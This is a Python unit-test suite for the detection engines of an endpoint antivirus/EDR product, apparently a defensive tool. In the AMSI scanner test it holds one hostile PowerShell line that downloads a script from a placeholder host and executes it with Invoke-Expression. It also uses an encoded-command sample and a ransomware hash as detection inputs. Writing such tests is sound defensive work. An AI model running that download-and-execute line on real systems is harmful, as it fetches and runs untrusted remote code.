"""
Comprehensive Integration and Unit Verification Suite for ATLAS Enterprise NGAV/EDR Upgrades.

Validates:
1. Fast Static Pre-Filter (ingestion/pre_filter.py)
2. Authenticode & Digital Signature Provenance (intelligence/authenticode.py)
3. Policy-Driven Anti-Ransomware Canary Trap Engine (behavior/canary_engine.py)
4. AMSI In-Memory Inspection Engine (intelligence/amsi_scanner.py)
5. VSS Ransomware Recovery & Incident Evidence Preservation (intelligence/rollback.py)
6. Self-Defense & Anti-Tampering Watchdog (intelligence/self_defense.py)
"""

import os
import sys
import unittest
import numpy as np

# Ensure root directory is on sys.path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from data_models import BehaviorGraph, BehaviorNode, BehaviorEdge
from ingestion.pre_filter import StaticPreFilterEngine
from intelligence.authenticode import AuthenticodeEngine
from behavior.canary_engine import CanaryTrapEngine
from intelligence.amsi_scanner import AMSIScanner
from intelligence.rollback import VSSRollbackManager
from intelligence.self_defense import SelfDefenseEngine
from main import BADNAAnalysisOrchestrator


class TestEnterpriseNGAVUpgrades(unittest.TestCase):

    def setUp(self):
        self.pre_filter = StaticPreFilterEngine()
        self.authenticode = AuthenticodeEngine()
        self.canary = CanaryTrapEngine()
        self.amsi = AMSIScanner()
        self.vss = VSSRollbackManager(evidence_dir="knowledge_base/test_evidence")
        self.self_defense = SelfDefenseEngine()

    def test_1_fast_static_pre_filter(self):
        """Verify Fast Static Pre-Filter hash and regex evaluation."""
        # Test hash matching
        res_hash = self.pre_filter.evaluate_hash("25a2653207908b9815594d75438848d7")
        self.assertIsNotNone(res_hash)
        self.assertTrue(res_hash.is_matched)
        self.assertEqual(res_hash.threat_name, "WannaCry.Ransomware")

        # Test command line regex matching
        res_cmd = self.pre_filter.evaluate_cmdline("powershell.exe -EncodedCommand AAAA1234567890qwertyuiop=")
        self.assertIsNotNone(res_cmd)
        self.assertTrue(res_cmd.is_matched)
        self.assertEqual(res_cmd.match_type, "regex")

    def test_2_authenticode_signature_provenance(self):
        """Verify digital signature provenance evidence extraction (non-bypassing)."""
        res = self.authenticode.verify_binary_signature(sys.executable)
        self.assertIsNotNone(res)
        self.assertIsInstance(res.trust_score, float)
        self.assertTrue(0.0 <= res.trust_score <= 1.0)

    def test_3_policy_driven_canary_engine(self):
        """Verify canary trap policy decision flow (no blind kills)."""
        # Test whitelisted tool touch -> LOG_EVENT
        canary_file = list(self.canary.canary_files.keys())[0]
        proc_whitelist = {"ProcessName": "searchindexer.exe", "pid": 1234}
        res_wl = self.canary.evaluate_canary_touch(canary_file, proc_whitelist, behavioral_risk_score=0.1, signature_trust_score=0.9)
        self.assertTrue(res_wl.is_canary_event)
        self.assertEqual(res_wl.action_recommended, "LOG_EVENT")

        # Test untrusted high-risk modification -> KILL_AND_ISOLATE
        proc_untrusted = {"ProcessName": "untrusted_encrypter.exe", "pid": 9999}
        res_untrusted = self.canary.evaluate_canary_touch(canary_file, proc_untrusted, behavioral_risk_score=0.85, signature_trust_score=0.2)
        self.assertTrue(res_untrusted.is_canary_event)
        self.assertEqual(res_untrusted.action_recommended, "HIGH_ALERT")

    def test_4_amsi_in_memory_scanner(self):
        """Verify AMSI script inspection and entropy analysis."""
        clean_script = "Write-Host 'Hello World'"
        res_clean = self.amsi.scan_script_content(clean_script)
        self.assertFalse(res_clean.is_malicious)

        malicious_script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')"
        res_malicious = self.amsi.scan_script_content(malicious_script)
        self.assertTrue(res_malicious.is_malicious)
        self.assertTrue(res_malicious.risk_score > 0.5)

    def test_5_vss_evidence_preservation(self):
        """Verify incident evidence preservation and VSS recovery verification."""
        proc_data = {"name": "malicious.exe", "pid": 8888, "cmd": "test_attack"}
        evidence = self.vss.preserve_incident_evidence(proc_data, affected_files=["test_file.txt"])
        self.assertIsNotNone(evidence.incident_id)
        self.assertTrue(os.path.exists(evidence.evidence_file_path))

        verification = self.vss.verify_recovery_snapshot()
        self.assertIn("vss_available", verification)

    def test_6_self_defense_watchdog(self):
        """Verify self-defense pid monitoring and watchdog initialization."""
        self.self_defense.add_monitored_pid(os.getpid())
        self.assertIn(os.getpid(), self.self_defense.monitored_pids)
        self.self_defense.start_watchdog()
        self.assertTrue(self.self_defense._running)
        self.self_defense.stop_watchdog()

    def test_7_orchestrator_integration(self):
        """Verify end-to-end BADNA orchestrator initialization with all NGAV engines."""
        orchestrator = BADNAAnalysisOrchestrator()
        self.assertIsNotNone(orchestrator.pre_filter)
        self.assertIsNotNone(orchestrator.authenticode_engine)
        self.assertIsNotNone(orchestrator.canary_engine)
        self.assertIsNotNone(orchestrator.amsi_scanner)
        self.assertIsNotNone(orchestrator.vss_manager)
        self.assertIsNotNone(orchestrator.self_defense)


if __name__ == "__main__":
    unittest.main()
